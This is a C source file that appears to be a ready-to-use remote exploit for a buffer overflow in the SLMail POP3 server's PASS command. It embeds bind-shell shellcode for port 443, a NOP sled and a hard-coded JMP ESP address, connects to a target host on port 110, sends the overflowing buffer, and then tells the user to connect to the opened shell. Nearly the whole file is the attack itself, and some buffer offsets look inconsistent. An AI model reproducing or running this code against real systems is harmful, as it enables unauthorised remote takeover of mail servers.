/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 443 
unsigned char shellcode[] = 
"\xbd\x97\x7c\x16\x89\xd9\xc1\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x6a\x12\x03\x6a\x12\x83\x7d\x80\xf4\x7c\x7d\x91\x7b"
"\x7e\x7d\x62\x1c\xf6\x98\x53\x1c\x6c\xe9\xc4\xac\xe6\xbf\xe8"
"\x47\xaa\x2b\x7a\x25\x63\x5c\xcb\x80\x55\x53\xcc\xb9\xa6\xf2"
"\x4e\xc0\xfa\xd4\x6f\x0b\x0f\x15\xb7\x76\xe2\x47\x60\xfc\x51"
"\x77\x05\x48\x6a\xfc\x55\x5c\xea\xe1\x2e\x5f\xdb\xb4\x25\x06"
"\xfb\x37\xe9\x32\xb2\x2f\xee\x7f\x0c\xc4\xc4\xf4\x8f\x0c\x15"
"\xf4\x3c\x71\x99\x07\x3c\xb6\x1e\xf8\x4b\xce\x5c\x85\x4b\x15"
"\x1e\x51\xd9\x8d\xb8\x12\x79\x69\x38\xf6\x1c\xfa\x36\xb3\x6b"
"\xa4\x5a\x42\xbf\xdf\x67\xcf\x3e\x0f\xee\x8b\x64\x8b\xaa\x48"
"\x04\x8a\x16\x3e\x39\xcc\xf8\x9f\x9f\x87\x15\xcb\xad\xca\x71"
"\x38\x9c\xf4\x81\x56\x97\x87\xb3\xf9\x03\x0f\xf8\x72\x8a\xc8"
"\xff\xa8\x6a\x46\xfe\x52\x8b\x4f\xc5\x07\xdb\xe7\xec\x27\xb0"
"\xf7\x11\xf2\x17\xa7\xbd\xad\xd7\x17\x7e\x1e\xb0\x7d\x71\x41"
"\xa0\x7e\x5b\xea\x4b\x85\x0c\x1f\x87\x85\x60\x77\x95\x85\x79"
"\x33\x10\x63\x13\x53\x75\x3c\x8c\xca\xdc\xb6\x2d\x12\xcb\xb3"
"\x6e\x98\xf8\x44\x20\x69\x74\x56\xd5\x99\xc3\x04\x70\xa5\xf9"
"\x20\x1e\x34\x66\xb0\x69\x25\x31\xe7\x3e\x9b\x48\x6d\xd3\x82"
"\xe2\x93\x2e\x52\xcc\x17\xf5\xa7\xd3\x96\x78\x93\xf7\x88\x44"
"\x1c\xbc\xfc\x18\x4b\x6a\xaa\xde\x25\xdc\x04\x89\x9a\xb6\xc0"
"\x4c\xd1\x08\x96\x50\x3c\xff\x76\xe0\xe9\x46\x89\xcd\x7d\x4f"
"\xf2\x33\x1e\xb0\x29\xf0\x2e\xfb\x73\x51\xa7\xa2\xe6\xe3\xaa"
"\x54\xdd\x20\xd3\xd6\xd7\xd8\x20\xc6\x92\xdd\x6d\x40\x4f\xac"
"\xfe\x25\x6f\x03\xfe\x6f";

void exploit(int sock) {
      FILE *test;
      char *ptr;
      char userbuf[] = "USER username\r\n";
      char evil[2606];
      char buf[3500];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3500);
      memset(evil, 0x00, 2606);
      memset(evil, 0x43, 523);
      ptr = &evil[0];
      ptr = ptr + 652; // trying to get 2606 from 2608
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 351);
      *(long*)&evil[2606] = 0x5f4a358f; // correct JMP ESP FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 443...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
